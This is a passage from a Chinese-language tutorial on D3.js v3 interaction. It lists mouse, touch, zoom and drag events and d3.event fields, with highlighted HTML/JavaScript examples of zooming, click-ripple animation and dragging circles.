class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .circle-item &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">800</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> r = <span class=\"number\">60</span>;</span></span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> data = [&#123;</span></span><br><span class=\"line\">            x: w / 2 - r,</span><br><span class=\"line\">            y: w / 2 - r</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 - r,</span><br><span class=\"line\">            y: w / 2 + r</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 + r,</span><br><span class=\"line\">            y: w / 2 - r</span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 + r,</span><br><span class=\"line\">            y: w / 2 + r</span><br><span class=\"line\">        &#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">zoomHandler</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> event = d3.event;</span></span><br><span class=\"line\"><span class=\"javascript\">            d3.select(<span class=\"string\">&#x27;.container&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;event.translate&#125;</span>) scale(<span class=\"subst\">$&#123;event.scale&#125;</span>)`</span>);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> zoom = d3.behavior.zoom()</span></span><br><span class=\"line\">            .scaleExtent([1, 10])</span><br><span class=\"line\"><span class=\"javascript\">            .on(<span class=\"string\">&#x27;zoom&#x27;</span>, zoomHandler);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h)</span></span><br><span class=\"line\">            .call(zoom);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> container = svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        container.selectAll(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\">            .data(data)</span><br><span class=\"line\">            .enter()</span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;circle-item&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"function\"><span class=\"params\">d</span> =&gt;</span> <span class=\"string\">`translate(<span class=\"subst\">$&#123;d.x&#125;</span>, <span class=\"subst\">$&#123;d.y&#125;</span>)`</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"number\">60</span>);</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"可视化交互\"><a href=\"#可视化交互\" class=\"headerlink\" title=\"可视化交互\"></a>可视化交互</h1><h3 id=\"1、事件类型\"><a href=\"#1、事件类型\" class=\"headerlink\" title=\"1、事件类型\"></a>1、事件类型</h3><ul>\n<li>鼠标事件<ul>\n<li><code>click</code> 单击</li>\n<li><code>dbclick</code> 双击</li>\n<li><code>mousemove</code> 鼠标移动</li>\n<li><code>mouseenter</code> 鼠标进入</li>\n<li><code>mouseleave</code> 鼠标离开</li>\n<li><code>mouseover</code> 鼠标滑入</li>\n<li><code>mouseout</code> 鼠标滑出</li>\n<li><code>mousedown</code> 鼠标按下</li>\n<li><code>mouseup</code> 鼠标弹起</li>\n</ul>\n</li>\n<li>触摸事件<ul>\n<li><code>touchstart</code> 触摸点在屏幕上接触时</li>\n<li><code>touchmove</code> 触摸点在屏幕上移动时</li>\n<li><code>touchend</code> 触摸点在屏幕上移开时</li>\n</ul>\n</li>\n<li>缩放、平移事件 <code>d3.behavior.zoom</code><ul>\n<li><code>d3.behavior.zoom</code> 创建一个缩放行为</li>\n<li><code>zoom(selection)</code> 将此缩放行为应用到 selection 上（一般使用 <code>selection.call(zoom)</code>）</li>\n<li><code>zoom.on(type, listener)</code> 设置事件类型和监听器<ul>\n<li><code>zoomstart</code> 缩放开始时</li>\n<li><code>zoom</code> 缩放中</li>\n<li><code>zoomend</code> 缩放结束时</li>\n</ul>\n</li>\n<li><code>zoom.scaleExtent()</code> 设置缩放的最小、最大值，默认为 <code>[0, +∞]</code></li>\n<li><code>zoom.scale()</code> 设置初始的缩放大小</li>\n<li><code>zoom.translate()</code> 设置当前缩放的平移向量，默认为 <code>[0, 0]</code></li>\n<li><code>zoom.duration()</code> 取得或设置双击事件的过渡持续的时间</li>\n<li><code>zoom.x()</code> 设置 X轴 方向的比例尺</li>\n<li><code>zoom.y()</code> 设置 Y轴 方向的比例尺</li>\n</ul>\n</li>\n<li>拖拽事件 <code>d3.behavior.drag</code><ul>\n<li><code>d3.behavior.darg</code> 创建一个拖拽行为</li>\n<li><code>darg(selection)</code> 将此拖拽行为应用到 selection 上（一般使用 <code>selection.call(darg)</code>）</li>\n<li><code>darg.on(type, listener)</code> 设置事件类型和监听器<ul>\n<li><code>dargstart</code> 拖拽开始时</li>\n<li><code>darg</code> 拖拽中</li>\n<li><code>dargend</code> 拖拽结束时</li>\n</ul>\n</li>\n<li><code>dray.origin()</code> 设置拖动行为的原点</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"2、事件对象-d3-event\"><a href=\"#2、事件对象-d3-event\" class=\"headerlink\" title=\"2、事件对象 d3.event\"></a>2、事件对象 <code>d3.event</code></h3><p>说明  <code>d3.evnet</code> 对象是 DOM 事件，并实现了标准事件字段</p>\n<ul>\n<li><code>event.x</code>: 相对于可视区的坐标（与 <code>event.clientX</code> 一样）</li>\n<li><code>event.clientX</code>: 相对于可视区的坐标（与滚动的距离无关，以浏览器左上角为基准）</li>\n<li><code>event.offsetX</code>: 相对于容器的坐标（鼠标与触发事件的元素的距离）</li>\n<li><code>event.pageX</code>: 鼠标位置相对于文档的坐标（包含滚动的距离，以文档左上角为基准）</li>\n<li><code>event.screenX</code>: 鼠标位置相对于屏幕 X 轴的坐标（与滚动的距离无关，以屏幕左上角为基准）</li>\n<li><code>event.translate</code>: 返回鼠标位移的数据，如 <code>[100, 20]</code></li>\n<li><code>event.scale</code>: 返回鼠标缩放的大小，如 <code>1.2</code></li>\n</ul>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .circle-item &#123;</span><br><span class=\"line\"><span class=\"css\">            fill: none;</span></span><br><span class=\"line\"><span class=\"css\">            stroke: <span class=\"number\">#090</span>;</span></span><br><span class=\"line\"><span class=\"css\">            stroke-<span class=\"attribute\">width</span>: <span class=\"number\">4</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"built_in\">document</span>.documentElement.clientWidth;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"built_in\">document</span>.documentElement.clientHeight;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.append(<span class=\"string\">&#x27;text&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;x&#x27;</span>, <span class=\"number\">10</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;y&#x27;</span>, <span class=\"number\">24</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;mouse-info&#x27;</span>);</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">updateInfo</span>(<span class=\"params\">str</span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            svg.select(<span class=\"string\">&#x27;.mouse-info&#x27;</span>).text(str);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        svg.on(<span class=\"string\">&#x27;mousemove&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> event = d3.event;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> str = <span class=\"string\">`x ：<span class=\"subst\">$&#123;event.offsetX&#125;</span> \\n Y: <span class=\"subst\">$&#123;event.offsetY&#125;</span>`</span>;</span></span><br><span class=\"line\">            updateInfo(str);</span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"javascript\">        svg.on(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> event = d3.event;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"built_in\">console</span>.log(event);</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> x = event.offsetX;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> y = event.offsetY;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> data = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>, <span class=\"number\">4</span>];</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">            svg.selectAll(<span class=\"string\">&#x27;cirle&#x27;</span>)</span></span><br><span class=\"line\">                .data(data)</span><br><span class=\"line\">                .enter()</span><br><span class=\"line\"><span class=\"javascript\">                .append(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;circle-item&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;cx&#x27;</span>, x)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;cy&#x27;</span>, y)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\">            .transition()</span><br><span class=\"line\">                .duration(2000)</span><br><span class=\"line\"><span class=\"javascript\">                .delay(<span class=\"function\">(<span class=\"params\">d, i</span>) =&gt;</span> <span class=\"built_in\">Math</span>.pow(i + <span class=\"number\">1</span>, <span class=\"number\">2</span>) * <span class=\"number\">100</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .ease(<span class=\"string\">&#x27;ease-out&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;r&#x27;</span>, <span class=\"number\">500</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;stroke-width&#x27;</span>, <span class=\"number\">1</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .style(<span class=\"string\">&#x27;opacity&#x27;</span>, <span class=\"number\">0</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .each(<span class=\"string\">&#x27;end&#x27;</span>, <span class=\"function\"><span class=\"keyword\">function</span> (<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">                    d3.select(<span class=\"built_in\">this</span>).remove();</span></span><br><span class=\"line\">                &#125;);</span><br><span class=\"line\">                </span><br><span class=\"line\">        &#125;);</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"meta-keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span> <span class=\"attr\">lang</span>=<span class=\"string\">&quot;en&quot;</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;viewport&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">http-equiv</span>=<span class=\"string\">&quot;X-UA-Compatible&quot;</span> <span class=\"attr\">content</span>=<span class=\"string\">&quot;ie=edge&quot;</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span>Document<span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">        .circle-item &#123;</span><br><span class=\"line\"><span class=\"css\">            <span class=\"attribute\">opacity</span>: .<span class=\"number\">5</span>;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">&quot;http://d3js.org/d3.v3.js&quot;</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> w = <span class=\"number\">800</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> h = <span class=\"number\">600</span>;</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> r = <span class=\"number\">60</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> data = [&#123;</span></span><br><span class=\"line\">            x: w / 2 - r,</span><br><span class=\"line\">            y: w / 2 - r</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 - r,</span><br><span class=\"line\">            y: w / 2 + r</span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 + r,</span><br><span class=\"line\">            y: w / 2 - r</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;, &#123;</span><br><span class=\"line\">            x: w / 2 + r,</span><br><span class=\"line\">            y: w / 2 + r</span><br><span class=\"line\">        &#125;];</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">dragHandler</span>(<span class=\"params\"></span>) </span>&#123;</span></span><br><span class=\"line\"><span class=\"javascript\">            <span class=\"keyword\">let</span> event = d3.event;</span></span><br><span class=\"line\"><span class=\"javascript\">            d3.select(<span class=\"built_in\">this</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">                .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"string\">`translate(<span class=\"subst\">$&#123;event.x&#125;</span>, <span class=\"subst\">$&#123;event.y&#125;</span>)`</span>);</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> drag = d3.behavior.drag().on(<span class=\"string\">&#x27;drag&#x27;</span>, dragHandler);</span></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> color = d3.scale.category10();</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> svg = d3.select(<span class=\"string\">&#x27;body&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;svg&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;width&#x27;</span>, w)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;height&#x27;</span>, h);</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"javascript\">        <span class=\"keyword\">let</span> container = svg.append(<span class=\"string\">&#x27;g&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;container&#x27;</span>);</span></span><br><span class=\"line\">            </span><br><span class=\"line\">            </span><br><span class=\"line\"><span class=\"javascript\">        container.selectAll(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\">            .data(data)</span><br><span class=\"line\">            .enter()</span><br><span class=\"line\"><span class=\"javascript\">            .append(<span class=\"string\">&#x27;circle&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;class&#x27;</span>, <span class=\"string\">&#x27;circle-item&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"javascript\">            .attr(<span class=\"string\">&#x27;transform&#x27;</span>, <span class=\"function\"><span class=\"params\">d</span> =&gt;</span> <span 